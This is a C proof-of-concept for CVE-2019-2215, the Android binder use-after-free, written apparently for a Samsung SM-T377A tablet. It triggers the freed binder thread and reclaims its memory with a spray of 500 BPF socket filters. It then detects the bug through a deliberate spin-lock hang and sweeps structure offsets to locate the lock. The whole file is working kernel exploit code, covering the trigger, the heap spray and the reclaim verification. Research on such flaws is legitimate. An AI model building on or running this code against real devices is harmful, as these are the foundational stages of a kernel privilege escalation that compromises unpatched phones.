/*
 * cve_2019_2215_hang.c — Definitive UAF proof via spin_lock hang detection
 *
 * KEY INSIGHT from kernel disassembly:
 *   binder_thread->wait is at offset 0x2C (44) from thread start
 *   wait_queue_head_t.lock is first 4 bytes = offset 0x2C in allocation
 *   In sk_filter, offset 0x2C = BPF insn[(44-20)/8] = insn[3], byte 0
 *
 * DEFINITIVE TEST:
 *   If we spray with BPF data that has NON-ZERO at offset 0x2C (insn[3].code),
 *   and the UAF IS happening (close(epfd) accesses sprayed data as spin_lock),
 *   then spin_lock(BPF_data + 0x2C) will see non-zero = "locked" and SPIN FOREVER.
 *   The child process will be killed by alarm() → exit signal = SIGALRM.
 *
 *   If close(epfd) completes normally, EITHER:
 *   a. Samsung patched the UAF (set whead=NULL before free)
 *   b. The spray didn't reclaim (unlikely with 500)
 *   c. binder_poll used proc->wait (transaction didn't work)
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o cve_2019_2215_hang cve_2019_2215_hang.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE        (128 * 1024)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_transaction_data {
    union { uint32_t handle; void *ptr; } target;
    void *cookie;
    uint32_t code;
    uint32_t flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    uint32_t data_size;
    uint32_t offsets_size;
    union {
        struct { const void *buffer; const void *offsets; } ptr;
        uint8_t buf8[8];
    } data;
};

#define BC_TRANSACTION  0x40286300
#define BC_ENTER_LOOPER 0x0000630C

#define NUM_SPRAY 500
#define BPF_INSNS 26

/* Confirmed from disassembly:
 * binder_thread->wait at offset 0x2C (44) from thread start
 * In sk_filter allocation: offset 0x2C = BPF insn data offset 24 = insn[3] byte 0
 * spin_lock reads 4 bytes at offset 0x2C: insn[3].code(2) + insn[3].jt(1) + insn[3].jf(1)
 */
#define WAIT_LOCK_OFFSET 0x2C  /* in allocation */
#define WAIT_LOCK_BPF_INSN 3   /* (0x2C - 20) / 8 = 3 */

static void pin_cpu(int cpu) {
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(cpu, &cs);
    sched_setaffinity(0, sizeof(cs), &cs);
}

static int do_enter_looper(int bfd) {
    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr = {
        .write_size = sizeof(cmd), .write_buffer = (unsigned long)&cmd,
    };
    return ioctl(bfd, BINDER_WRITE_READ, &bwr);
}

static int do_transaction(int bfd) {
    char data[4] = {0};
    struct binder_transaction_data txn = {0};
    txn.target.handle = 0; txn.code = 1;
    txn.data_size = 4; txn.data.ptr.buffer = data;

    uint32_t cmd = BC_TRANSACTION;
    unsigned char wb[sizeof(cmd) + sizeof(txn)];
    memcpy(wb, &cmd, sizeof(cmd));
    memcpy(wb + sizeof(cmd), &txn, sizeof(txn));

    struct binder_write_read bwr = {
        .write_size = sizeof(wb), .write_buffer = (unsigned long)wb,
    };
    return ioctl(bfd, BINDER_WRITE_READ, &bwr);
}

/* Create BPF filter with specific lock value at offset 0x2C */
static void make_lock_bpf(struct sock_filter *insns, uint16_t lock_code,
                           uint8_t lock_jt, uint8_t lock_jf) {
    /* All instructions valid BPF_LD_IMM (code=0) with k=0 */
    for (int i = 0; i < BPF_INSNS - 1; i++)
        insns[i] = (struct sock_filter){ 0x0000, 0, 0, 0x00000000 };

    /* Set insn[3] to have non-zero code → spin_lock at offset 0x2C reads non-zero */
    insns[WAIT_LOCK_BPF_INSN].code = lock_code;
    insns[WAIT_LOCK_BPF_INSN].jt = lock_jt;
    insns[WAIT_LOCK_BPF_INSN].jf = lock_jf;

    /* Last insn = BPF_RET */
    insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
}

/* ========== TEST 1: Hang detection with BC_TRANSACTION ========== */

static void test_hang_with_txn(void) {
    printf("=== TEST 1: Hang detection (with BC_TRANSACTION) ===\n");
    printf("  If UAF happens: close(epfd) spin_locks on 0xFFFF → HANG → SIGALRM\n");
    printf("  If no UAF:      close(epfd) completes → clean exit\n\n");

    int hangs = 0, cleans = 0;

    for (int trial = 0; trial < 20; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3); /* 3 seconds — if hung, SIGALRM kills us */
            pin_cpu(0);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(99);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* Set transaction_stack → wait_for_proc_work = false */
            do_enter_looper(bfd);
            do_transaction(bfd);

            /* epoll on binder → entry goes to thread->wait (if txn worked) */
            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            /* FREE the thread */
            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* Spray with NON-ZERO lock value at offset 0x2C */
            struct sock_filter insns[BPF_INSNS];
            make_lock_bpf(insns, 0xFFFF, 0xFF, 0xFF); /* lock = 0xFFFFFFFF */
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };

            int socks[NUM_SPRAY];
            for (int i = 0; i < NUM_SPRAY; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0)
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            }

            /* TRIGGER: if UAF, spin_lock sees 0xFFFFFFFF → hangs forever */
            close(epfd);

            /* If we get here, close completed (no UAF or Samsung fixed it) */
            for (int i = 0; i < NUM_SPRAY; i++) close(socks[i]);
            close(bfd);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) == SIGALRM) {
            printf("  [%d] *** HANG (SIGALRM) — UAF CONFIRMED! ***\n", trial);
            hangs++;
        } else if (WIFSIGNALED(status)) {
            printf("  [%d] CRASH sig=%d\n", trial, WTERMSIG(status));
        } else {
            cleans++;
        }

        if ((trial + 1) % 5 == 0)
            printf("  [%d/%d] hangs=%d cleans=%d\n", trial + 1, 20, hangs, cleans);
    }

    printf("\n  RESULT: %d hangs, %d cleans out of 20\n", hangs, cleans);
    if (hangs > 0) {
        printf("  *** CVE-2019-2215 UAF CONFIRMED! spin_lock on sprayed data! ***\n");
    } else {
        printf("  No hangs — Samsung likely patched (whead=NULL or no thread->wait)\n");
    }
    printf("\n");
}

/* ========== TEST 2: Hang detection WITHOUT BC_TRANSACTION (baseline) ========== */

static void test_hang_without_txn(void) {
    printf("=== TEST 2: Baseline (no BC_TRANSACTION, proc->wait expected) ===\n\n");

    int hangs = 0;

    for (int trial = 0; trial < 5; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            pin_cpu(0);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(99);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* NO transaction → proc->wait expected */
            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            struct sock_filter insns[BPF_INSNS];
            make_lock_bpf(insns, 0xFFFF, 0xFF, 0xFF);
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };
            int socks[NUM_SPRAY];
            for (int i = 0; i < NUM_SPRAY; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0)
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            }

            close(epfd);
            for (int i = 0; i < NUM_SPRAY; i++) close(socks[i]);
            close(bfd);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) == SIGALRM) {
            printf("  [%d] HANG — unexpected!\n", trial);
            hangs++;
        } else {
            printf("  [%d] clean (proc->wait, no UAF)\n", trial);
        }
    }
    printf("  Hangs: %d/5 (expected: 0)\n\n", hangs);
}

/* ========== TEST 3: Try with BC_REPLY error instead of BC_TRANSACTION ========== */

static void test_hang_with_reply(void) {
    printf("=== TEST 3: BC_REPLY error (sets return_error) ===\n\n");

    int hangs = 0;

    for (int trial = 0; trial < 10; trial++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            pin_cpu(0);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(99);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* BC_REPLY without pending transaction → return_error = BR_FAILED_REPLY */
            struct binder_transaction_data txn = {0};
            uint32_t cmd = 0x40286301; /* BC_REPLY */
            unsigned char wb[sizeof(cmd) + sizeof(txn)];
            memcpy(wb, &cmd, sizeof(cmd));
            memcpy(wb + sizeof(cmd), &txn, sizeof(txn));
            struct binder_write_read bwr = {
                .write_size = sizeof(wb), .write_buffer = (unsigned long)wb,
            };
            ioctl(bfd, BINDER_WRITE_READ, &bwr);

            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            struct sock_filter insns[BPF_INSNS];
            make_lock_bpf(insns, 0xFFFF, 0xFF, 0xFF);
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };
            int socks[NUM_SPRAY];
            for (int i = 0; i < NUM_SPRAY; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0)
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            }

            close(epfd);
            for (int i = 0; i < NUM_SPRAY; i++) close(socks[i]);
            close(bfd);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) == SIGALRM) {
            printf("  [%d] *** HANG (SIGALRM) — UAF via return_error! ***\n", trial);
            hangs++;
        } else {
            printf("  [%d] clean\n", trial);
        }
    }
    printf("  Hangs: %d/10\n\n", hangs);
}

/* ========== TEST 4: Varying lock offsets (in case struct differs) ========== */

static void test_offset_sweep(void) {
    printf("=== TEST 4: Offset sweep (Samsung struct may differ) ===\n");
    printf("  Try non-zero at different BPF insn positions\n\n");

    /* Try offsets 20 to 220 in steps of 8 (each BPF instruction) */
    for (int insn_idx = 0; insn_idx < BPF_INSNS - 1; insn_idx++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            pin_cpu(0);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(99);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            do_enter_looper(bfd);
            do_transaction(bfd);

            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* Spray: ALL zeros except one insn has non-zero code */
            struct sock_filter insns[BPF_INSNS];
            for (int i = 0; i < BPF_INSNS - 1; i++)
                insns[i] = (struct sock_filter){ 0, 0, 0, 0 };
            /* Set ONE instruction non-zero at the target index */
            insns[insn_idx] = (struct sock_filter){ 0xFFFF, 0xFF, 0xFF, 0xFFFFFFFF };
            insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };

            struct sock_fprog prog = { .len = BPF_INSNS, .filter = insns };
            int socks[NUM_SPRAY];
            for (int i = 0; i < NUM_SPRAY; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0)
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            }

            close(epfd);
            for (int i = 0; i < NUM_SPRAY; i++) close(socks[i]);
            close(bfd);
            _exit(0);
        }

        int status;
        waitpid(pid, &status, 0);
        int alloc_off = 20 + insn_idx * 8;
        if (WIFSIGNALED(status) && WTERMSIG(status) == SIGALRM) {
            printf("  insn[%d] (alloc+%d): *** HANG — LOCK IS HERE! ***\n",
                   insn_idx, alloc_off);
        } else if (WIFSIGNALED(status)) {
            printf("  insn[%d] (alloc+%d): CRASH sig=%d\n",
                   insn_idx, alloc_off, WTERMSIG(status));
        } else {
            printf("  insn[%d] (alloc+%d): clean\n", insn_idx, alloc_off);
        }
    }
    printf("\n");
}

int main(void) {
    printf("=== CVE-2019-2215 Hang Detection Test ===\n");
    printf("SM-T377A kernel 3.10.9 | wait_queue at thread+0x2C\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    alarm(600);

    test_hang_without_txn();  /* Baseline: should be 0 hangs */
    test_hang_with_txn();     /* Main test: hangs = UAF confirmed */
    test_hang_with_reply();   /* Alternative trigger */
    test_offset_sweep();      /* Sweep all possible offsets */

    printf("--- dmesg ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -20 | grep -iE 'binder|spin|lock|hang|stuck|rcu' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
